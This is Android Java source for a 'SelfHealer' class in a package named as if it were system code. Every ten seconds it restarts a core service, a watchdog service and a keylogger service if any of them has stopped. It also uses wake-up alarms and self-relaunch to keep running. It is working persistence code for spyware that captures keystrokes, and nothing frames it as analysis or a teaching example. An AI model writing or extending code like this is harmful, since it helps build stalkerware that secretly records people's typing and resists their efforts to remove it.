package com.xrc.system.core;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.util.Log;

import com.xrc.system.service.CoreService;
import com.xrc.system.service.WatchdogService;
import com.xrc.system.service.KeyloggerService;

import java.util.List;

public class SelfHealer {
    private static final String TAG = Constants.TAG + ":Healer";
    private static final long HEAL_INTERVAL = 10000;
    private static SelfHealer instance;
    private final Context ctx;
    private final Handler handler;
    private boolean running = false;

    private SelfHealer(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.handler = new Handler(Looper.getMainLooper());
    }

    public static synchronized SelfHealer get(Context ctx) {
        if (instance == null) {
            instance = new SelfHealer(ctx);
        }
        return instance;
    }

    public void start() {
        if (running) return;
        running = true;
        scheduleHeal();
        Log.i(TAG, "Self-healer started");
    }

    public void stop() {
        running = false;
        handler.removeCallbacksAndMessages(null);
        Log.i(TAG, "Self-healer stopped");
    }

    private void scheduleHeal() {
        if (!running) return;
        handler.postDelayed(this::heal, HEAL_INTERVAL);
    }

    private void heal() {
        try {
            if (!isServiceRunning(CoreService.class)) {
                Log.w(TAG, "CoreService dead — resurrecting");
                startService(CoreService.class);
            }
            if (!isServiceRunning(WatchdogService.class)) {
                Log.w(TAG, "Watchdog dead — resurrecting");
                startService(WatchdogService.class);
            }
            if (!isServiceRunning(KeyloggerService.class)) {
                Log.w(TAG, "Keylogger dead — resurrecting");
                startService(KeyloggerService.class);
            }
            ensureAlarmSet();
        } catch (Exception e) {
            Log.e(TAG, "Heal cycle failed", e);
        }
        scheduleHeal();
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        if (am == null) return false;
        List<ActivityManager.RunningServiceInfo> services = am.getRunningServices(Integer.MAX_VALUE);
        for (ActivityManager.RunningServiceInfo info : services) {
            if (serviceClass.getName().equals(info.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void startService(Class<?> cls) {
        Intent intent = new Intent(ctx, cls);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
    }

    private void ensureAlarmSet() {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        Intent intent = new Intent(ctx, CoreService.class);
        PendingIntent pi = PendingIntent.getService(ctx, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        long trigger = System.currentTimeMillis() + 60000;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (am.canScheduleExactAlarms()) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi);
            } else {
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi);
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi);
        } else {
            am.setRepeating(AlarmManager.RTC_WAKEUP, trigger, 60000, pi);
        }
    }

    public void triggerRestart() {
        Log.w(TAG, "Triggering app restart");
        Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(ctx.getPackageName());
        if (intent == null) return;
        PendingIntent pi = PendingIntent.getActivity(ctx, 0, intent,
                PendingIntent.FLAG_CANCEL_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am != null) {
            am.set(AlarmManager.RTC, System.currentTimeMillis() + 2000, pi);
        }
        Process.killProcess(Process.myPid());
    }

    public void schedulePeriodicRestart(long delayMs) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        Intent intent = new Intent(ctx, CoreService.class);
        intent.setAction(Constants.ACTION_START_SERVICES);
        PendingIntent pi = PendingIntent.getService(ctx, 99, intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        long trigger = System.currentTimeMillis() + delayMs;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi);
        } else {
            am.setExact(AlarmManager.RTC_WAKEUP, trigger, pi);
        }
    }
}
